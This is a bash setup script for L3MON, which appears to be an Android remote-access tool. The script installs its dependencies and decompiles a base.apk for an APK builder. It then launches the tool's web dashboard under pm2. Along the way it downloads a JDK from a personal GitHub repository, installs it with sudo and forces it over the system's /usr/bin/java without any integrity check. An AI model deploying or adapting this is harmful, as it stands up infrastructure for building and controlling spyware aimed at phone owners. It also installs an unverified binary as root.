#!/bin/bash

# L3MON One-Time Setup Script
# Developed for evrahimkhan

echo "🚀 Starting L3MON One-Time Setup..."

# 1. Update and Install Base Dependencies
echo "📦 Installing system dependencies..."
sudo apt update && sudo apt install -y wget curl git npm nodejs

# 2. Java 8 Check/Installation (download from github.com/evrahimkhan/java)
echo "☕ Checking Java 8..."
JAVA_HOME_DIR="/usr/lib/jvm/jdk1.8.0_202"
if java -version 2>&1 | grep -q "1.8.0"; then
    echo "✅ Java 8 is already active."
else
    echo "⚠️ Java 8 not detected. Downloading JDK 8u202 from GitHub..."
    mkdir -p /tmp/java-setup
    # Get temporary download URL from Git LFS batch API
    LFS_URL=$(curl -s -X POST https://github.com/evrahimkhan/java.git/info/lfs/objects/batch \
        -H "Content-Type: application/vnd.git-lfs+json" \
        -H "Accept: application/vnd.git-lfs+json" \
        -d '{"operation":"download","transfers":["basic"],"objects":[{"oid":"9a5c32411a6a06e22b69c495b7975034409fa1652d03aeb8eb5b6f59fd4594e0","size":194042837}]}' \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['objects'][0]['actions']['download']['href'])" 2>/dev/null)
    if [ -z "$LFS_URL" ]; then
        echo "❌ Failed to get download URL from LFS API."
        echo "   Falling back to git clone..."
        rm -rf /tmp/java-setup/java-repo
        git clone --depth 1 https://github.com/evrahimkhan/java.git /tmp/java-setup/java-repo 2>&1
        cd /tmp/java-setup/java-repo && git lfs pull 2>&1 && cd -
        if [ -f /tmp/java-setup/java-repo/jdk-8u202-linux-x64.tar.gz ]; then
            sudo mkdir -p "$JAVA_HOME_DIR"
            sudo tar -xzf /tmp/java-setup/java-repo/jdk-8u202-linux-x64.tar.gz -C /usr/lib/jvm/ --strip-components=0
            rm -rf /tmp/java-setup/java-repo
        fi
    elif wget -q --show-progress -O /tmp/java-setup/jdk8.tar.gz "$LFS_URL"; then
        sudo mkdir -p /usr/lib/jvm
        sudo tar -xzf /tmp/java-setup/jdk8.tar.gz -C /usr/lib/jvm/ --strip-components=0
        rm -f /tmp/java-setup/jdk8.tar.gz
    else
        echo "❌ wget failed. Trying curl..."
        curl -L -o /tmp/java-setup/jdk8.tar.gz "$LFS_URL" 2>&1
        sudo mkdir -p /usr/lib/jvm
        sudo tar -xzf /tmp/java-setup/jdk8.tar.gz -C /usr/lib/jvm/ --strip-components=0
        rm -f /tmp/java-setup/jdk8.tar.gz
    fi
    if [ -d "$JAVA_HOME_DIR/bin" ]; then
        # Remove existing alternatives and force Java 8 as default
        sudo update-alternatives --install /usr/bin/java java "$JAVA_HOME_DIR/bin/java" 9999
        sudo update-alternatives --set java "$JAVA_HOME_DIR/bin/java"
        sudo update-alternatives --install /usr/bin/javac javac "$JAVA_HOME_DIR/bin/javac" 9999
        sudo update-alternatives --set javac "$JAVA_HOME_DIR/bin/javac"
        # Also override /usr/bin/java directly if alternatives didn't work
        sudo ln -sf "$JAVA_HOME_DIR/bin/java" /usr/bin/java
        sudo ln -sf "$JAVA_HOME_DIR/bin/javac" /usr/bin/javac
        export JAVA_HOME="$JAVA_HOME_DIR"
        export PATH="$JAVA_HOME_DIR/bin:$PATH"
        # Persist for PM2 and future sessions
        if ! grep -q "jdk1.8.0_202" ~/.bashrc 2>/dev/null; then
            echo "export JAVA_HOME=$JAVA_HOME_DIR" >> ~/.bashrc
            echo "export PATH=$JAVA_HOME_DIR/bin:\$PATH" >> ~/.bashrc
        fi
        source ~/.bashrc 2>/dev/null || true
        echo "✅ Java 8 installed to $JAVA_HOME_DIR"
    else
        echo "❌ Java 8 installation failed. Please install manually."
        echo "   Repo: https://github.com/evrahimkhan/java"
    fi
fi

# 3. Node.js Dependencies
echo "npm 🛠️ Installing Node.js dependencies..."
npm install
npm install socket.io@2.2.0 --save # Force correct version for this codebase

# 4. Decompile base.apk (required for APK builder - decompiled/ is gitignored)
echo "📦 Decompiling base.apk for APK builder..."
if [ -f "app/factory/base.apk" ] && [ -f "app/factory/apktool.jar" ]; then
    if [ ! -d "app/factory/decompiled/smali" ]; then
        "$JAVA_HOME_DIR/bin/java" -jar app/factory/apktool.jar d app/factory/base.apk -o app/factory/decompiled -f
        echo "✅ base.apk decompiled."
    else
        echo "✅ Decompiled directory already exists."
    fi
else
    echo "⚠️ base.apk or apktool.jar not found — APK builder will auto-decompile on first build."
fi

# 4. Apply EJS Syntax Fixes (Critical for newer EJS versions)
echo "🛠️ Patching EJS templates for compatibility..."
find assets/views -name "*.ejs" -exec sed -i "s|<% include \([^'\" ]*\) %>|<%- include('\1') %>|g" {} +
echo "✅ EJS templates patched."

# 5. Database Initialization
if [ ! -f "maindb.json" ]; then
    echo "🗄️ Initializing database..."
    cp maindb.json.back maindb.json
    echo "⚠️ maindb.json created from backup. Please update it with your MD5 password."
else
    echo "✅ maindb.json already exists."
fi

# 6. PM2 Setup
echo "🚀 Setting up PM2..."
sudo npm install pm2 -g
pm2 delete L3MON 2>/dev/null || true
pm2 delete index 2>/dev/null || true
pm2 start index.js --name D3MONE
pm2 save

echo "------------------------------------------------"
echo "✅ Setup Complete!"
echo "Dashboard: http://127.0.0.1:22533"
echo "Manage with: pm2 status, pm2 logs, pm2 stop D3MONE"
echo "------------------------------------------------"
